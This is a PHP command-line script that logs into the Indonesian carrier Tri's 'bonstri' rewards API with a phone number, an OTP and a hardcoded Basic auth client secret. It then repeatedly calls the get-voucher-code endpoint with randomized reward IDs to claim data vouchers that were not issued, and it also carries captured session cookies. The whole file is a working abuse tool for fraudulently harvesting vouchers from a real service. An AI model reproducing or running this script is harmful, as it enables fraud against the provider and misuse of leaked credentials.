<?php
function request($url, $data = null, $headers = null, $put = null)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	if($put):
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
	endif;
	if($data):
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	endif;
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	if($headers):
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	endif;
	curl_setopt($ch, CURLOPT_ENCODING, "GZIP");
	return curl_exec($ch);
}
function getstr($str, $exp1, $exp2)
{
	$a = explode($exp1, $str)[1];
	return explode($exp2, $a)[0];
}
echo "NO HP: ";
$nohp = trim(fgets(STDIN));
$url = "http://bonstri.tri.co.id/api/v1/login/request-otp";
$data = "{\"msisdn\":\"$nohp\"}";
$len = strlen($data);
$headers = array();
$headers[] = "Host: bonstri.tri.co.id";
$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36";
$headers[] = "Accept: application/json, text/plain, */*";
$headers[] = "Accept-Language: en-US,en;q=0.5";
$headers[] = "Accept-Encoding: gzip, deflate";
$headers[] = "Content-Type: application/json";
$headers[] = "Content-Length: $len";
$headers[] = "Origin: http://bonstri.tri.co.id";
$headers[] = "DNT: 1";
$headers[] = "Connection: close";
$headers[] = "Referer: http://bonstri.tri.co.id/login?returnUrl=%2Fhome";
$headers[] = "Cookie: TS0100d305=0162c9cb494eec12bb5ebd5a0cf9d600d03ff497d0dd6544efb7c8bcd36ba3bf7656a4845cbaa6e8685ebdbda2e6f9b0ded9926243";
$getotp = request($url, $data, $headers);

echo "OTP: ";
$otp = trim(fgets(STDIN));
$url = "http://bonstri.tri.co.id/api/v1/login/validate-otp";
$data = "grant_type=password&username=$nohp&password=$otp";
$len = strlen($data);
$headers = array();
$headers[] = "Host: bonstri.tri.co.id";
$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36";
$headers[] = "Accept: application/json, text/plain, */*";
$headers[] = "Accept-Language: en-US,en;q=0.5";
$headers[] = "Accept-Encoding: gzip, deflate";
$headers[] = "Authorization: Basic Ym9uc3RyaTpib25zdHJpc2VjcmV0";
$headers[] = "Content-Type: application/x-www-form-urlencoded";
$headers[] = "Content-Length: $len";
$headers[] = "Origin: http://bonstri.tri.co.id";
$headers[] = "DNT: 1";
$headers[] = "Connection: close";
$headers[] = "Referer: http://bonstri.tri.co.id/login?returnUrl=%2Fhome";
$headers[] = "Cookie: TS0100d305=0162c9cb494eec12bb5ebd5a0cf9d600d03ff497d0dd6544efb7c8bcd36ba3bf7656a4845cbaa6e8685ebdbda2e6f9b0ded9926243";
$login = request($url, $data, $headers);
$bearer = getstr($login, '"access_token":"','"');

$url = "http://bonstri.tri.co.id/api/v1/voucherku/voucher-history";
$data = "{}";
$headers = array();
$headers[] = "Host: bonstri.tri.co.id";
$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36";
$headers[] = "Accept: application/json, text/plain, */*";
$headers[] = "Accept-Language: en-US,en;q=0.5";
$headers[] = "Accept-Encoding: gzip, deflate";
$headers[] = "Authorization: Bearer $bearer";
$headers[] = "Content-Type: application/json";
$headers[] = "Content-Length: 2";
$headers[] = "Origin: http://bonstri.tri.co.id";
$headers[] = "Connection: close";
$headers[] = "Referer: http://bonstri.tri.co.id/voucherku";
$headers[] = "Cookie: _ga=GA1.3.2053671532.1587780555; _gid=GA1.3.888559198.1587780555; TS0100d305=0162c9cb49e0d157a2c80ae96556c73d3bea058f3c536b787d6659d580e73a70a6f3a02af9a84533df5bea7f93242a4490a524d4b3; _gat_gtag_UA_128593534_1=1";
$gettrx = request($url, $data, $headers);
$trxid = getstr($gettrx, 'GB 1 Hari (Jam 01:00 - 12:00)","rewardTransactionId":"','"');

tembak:
echo "[?] Tembak Berapa : ";
$loop = trim(fgets(STDIN));
for ($x = 0; $x < $loop; $x++) {
$rand = substr(str_shuffle(str_repeat('0123456789', mt_rand(1,3))), 1, 3);
$url = "http://bonstri.tri.co.id/api/v1/voucherku/get-voucher-code";
$data = "{\"rewardId\":\"2311180$rand\",\"rewardTransactionId\":\"$trxid\"}";
$headers = array();
$headers[] = "Host: bonstri.tri.co.id";
$headers[] = "Accept: application/json, text/plain, */*";
$headers[] = "Authorization: Bearer $bearer";
$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36";
$headers[] = "Content-Type: application/json";
$headers[] = "Origin: http://bonstri.tri.co.id";
$headers[] = "Referer: http://bonstri.tri.co.id/voucherku";
$headers[] = "Accept-Encoding: gzip, deflate";
$headers[] = "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6";
$headers[] = "Cookie: _ga=GA1.3.770946611.1584431943; _gid=GA1.3.168000598.1584431943; TS0100d305=0162c9cb490990834a7708193e20bbd775eae933ce3e50f34503ef106b69d7ceacc5ecf66e5fb6ca7a51870037152284bafaf2991d";
$headers[] = "Connection: close";
$exec = request($url, $data, $headers);
if(strpos($exec, '"data":"Success"') !== false)
{
	echo "Success Tembak!\n";
}
else
{
	echo "Failed Tembak!";
}
}